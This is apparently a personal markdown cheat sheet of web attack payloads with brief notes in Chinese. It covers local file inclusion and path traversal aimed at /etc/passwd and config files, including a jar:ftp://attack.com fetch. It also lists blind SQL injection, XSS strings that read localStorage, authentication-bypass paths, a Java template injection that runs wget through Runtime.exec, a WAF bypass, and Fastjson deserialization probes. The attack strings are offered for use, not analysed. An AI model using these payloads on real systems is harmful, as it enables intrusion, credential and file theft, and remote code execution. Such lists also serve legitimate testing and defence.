# Payloads

LFI

```
Java
netdoc:///etc/passwd
netdoc://xxx/etc/passwd
jar:http://localhost!/
jar:ftp://attack.com!/
jar:proto-schema://domain!/

PHP
hxxp://example.com/page.php?page=\\1.1.1.1\test.txt

IOT
hxxp://IP/fs/../../tmp/dropbear/dropbearpwd

APISIX
hxxp://IP/public-service/../protected-service/protected
hxxp://IP/public-service/..%2Fprotected-service/protected

ASP.NET MVC
来自 https://medium.com/@frycos/pwning-3cx-phone-management-backends-from-the-internet-d0096339dd88
hxxp://site/Electron/download/windows/..\..\..\Http\webroot\config.json
hxxp://site/Electron/download/windows/Windows\win.ini
hxxp://site/Electron/download/windows/C:drivers\etc\hosts
```

SQLI

```
无逗号时间盲注
xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-'

来自 https://www.astrocamel.com/web/2022/01/25/my-sqli-adventure-or-why-you-should-make-sure-your-waf-is-configured-properly.html
a@b.c')OR(t2.id = t1.id)AND(t2.q_id IN (1, 2, 3, 4))AND('a'=(SELECT(right((SELECT column1/*", "*/FROM table1 LIMIT 1 OFFSET 0),1))))AND('a'='a
```

Reflected XSS

```
<a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(1337)</a:script>
```

DOM XSS

```
绕过双引号转义，用结尾的 // 和前面的 }} 闭合 function()
\"}})})-confirm`1`(a=>{({b:{/*///

来自 https://github.com/oskarsve/ms-teams-rce/blob/main/README.md
"angular expression filtering can be bypassed by injecting a nullbyte char in unicode \u0000"
{{['if(typeof onetime==`undefined`){onetime=1;console.log(localStorage);}'].forEach($root.$$childHead.$$nextSibling.app.$window.eval)}\u0000}
```

AFD

```
/manage/log/view?filename=/etc/passwd&base=../../../../../
/utility/download.aspx?f=.+./utility/download.aspx
file:///c:/windows/system32/cmd.exe /c calc
abc.exe\..\
```

Redirect

```
target.com/admin         –> HTTP 302 (redirect to login page)
target.com/admin%20/     -> HTTP 200 OK
target.com/Admin/        -> HTTP 200 OK
target.com/%20admin%20/  -> HTTP 200 OK
target.com/admin%20/page -> HTTP 200 OK

/jk-status;              -> Auth required
/jk-status;?cmd=dump     -> No authentication
```

Java Template Injection

```
https://cyc10n3.medium.com/rce-via-server-side-template-injection-ad46f8e0c2ae
${("".getClass()).forName("java.lang".concat("Runtime")).getMethods()[6].invoke(("".getClass()).forName("java.lang".concat("Runtime"))).exec("wget")}
```

WAF

```
替换VERB绕过
XXX /test.php?id=INJECTION HTTP/1.1
```

Fastjson

```
{"@type":"org.apache.commons.proxy.provider.remoting.RmiProvider","host":"127.0.0.1",port:"1099","name":"tr1ple"}
{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"dnslog"}}""}
{"@type":"java.net.Inet4Address","val":"dnslog"}
{"@type":"java.net.Inet6Address","val":"dnslog"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
{{"@type":"java.net.URL","val":"dnslog"}:"aaa"}
Set[{"@type":"java.net.URL","val":"dnslog"}]
Set[{"@type":"java.net.URL","val":"dnslog"}
{{"@type":"java.net.URL","val":"dnslog"}:0}
```

# App specific

S3 Bucket

```
来自 https://medium.com/@localh0t/unveiling-amazon-s3-bucket-names-e1420ceaf4fa，爆出 bucket 名字
https://example.com/avatars/123%C0
```

Joomla

```
example.com/components/
```

